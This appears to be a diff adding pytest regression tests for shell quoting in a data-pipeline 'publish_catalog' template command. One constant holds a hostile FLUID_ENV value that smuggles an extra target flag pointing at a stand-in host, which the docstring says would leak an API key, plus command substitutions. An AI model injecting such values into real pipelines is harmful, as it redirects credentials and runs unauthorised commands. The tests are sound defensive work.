@@ -23,6 +23,9 @@ from __future__ import annotations
 
 import argparse
 import logging
+import shutil
+import subprocess
+from pathlib import Path
 from unittest.mock import patch
 
 import pytest
@@ -314,6 +317,37 @@ class TestPipelineTemplateCommands:
         cmd = self._cmds()["publish_catalog"]
         assert "${CATALOG:-datamesh-manager}" in cmd
 
+    def test_publish_catalog_publishes_the_env_the_other_stages_use(self):
+        """Both branches pass ``--env``, as diff/plan/apply/verify do, so the
+        catalog gets the overlay's binding and not the base contract's."""
+        cmd = self._cmds()["publish_catalog"]
+        assert cmd.count('--env "${FLUID_ENV:-dev}"') == 2
+
+    @pytest.mark.skipif(shutil.which("sh") is None, reason="needs a POSIX shell")
+    @pytest.mark.parametrize(
+        ("branch_env", "expected_target"),
+        [
+            ({"PUBLISH_TARGETS": "command-center"}, "command-center"),
+            (
+                {"DMM_API_URL": "https://dmm.example", "CATALOG": "datamesh-manager"},
+                "datamesh-manager",
+            ),
+        ],
+    )
+    def test_publish_catalog_passes_a_hostile_env_as_one_argument(
+        self, tmp_path, branch_env, expected_target
+    ):
+        """Run the rendered command with ``sh`` and a ``fluid`` stub that prints
+        its argv. Unquoted, a FLUID_ENV holding spaces became extra flags: a
+        second ``--target command-center:<endpoint>`` sends the API key to that
+        endpoint. ``fluid publish --env`` then refuses the one odd token."""
+        _run_rendered_publish(
+            tmp_path,
+            self._cmds()["publish_catalog"],
+            branch_env,
+            ["publish", "c.yaml", "--target", expected_target, "--env"],
+        )
+
     def test_publish_catalog_no_longer_uses_deprecated_flag(self):
         """After Phase 5, the template must not emit ``fluid publish
         ... --catalog`` — that flag is a deprecation-warned alias and
@@ -417,3 +451,24 @@ class TestOdcsOutputPortLinkage:
                 f"contractId should contain the port name; "
                 f"got name={port['name']!r}, contractId={port['contractId']!r}"
             )
+
+
+_HOSTILE_ENV = "aws --target command-center:https://elsewhere.example $(touch pwned) `touch pwned2`"
+
+
+def _run_rendered_publish(
+    tmp_path: Path, command: str, extra_env: dict, expected_prefix: list
+) -> None:
+    """Run a rendered stage-10 shell body with a ``fluid`` stub; assert the
+    hostile ``FLUID_ENV`` reaches ``fluid`` as one argument and runs nothing."""
+    stub = tmp_path / "fluid"
+    stub.write_text('#!/bin/sh\nfor a in "$@"; do printf \'%s\\n\' "$a"; done\n')
+    stub.chmod(0o755)
+    env = {"PATH": f"{tmp_path}:/usr/bin:/bin", "CONTRACT": "c.yaml", "FLUID_ENV": _HOSTILE_ENV}
+    env.update(extra_env)
+    out = subprocess.run(
+        ["sh", "-c", command], cwd=tmp_path, env=env, capture_output=True, text=True, timeout=30
+    )
+    assert out.returncode == 0, out.stderr
+    assert out.stdout.splitlines() == [*expected_prefix, _HOSTILE_ENV]
+    assert not list(tmp_path.glob("pwned*"))
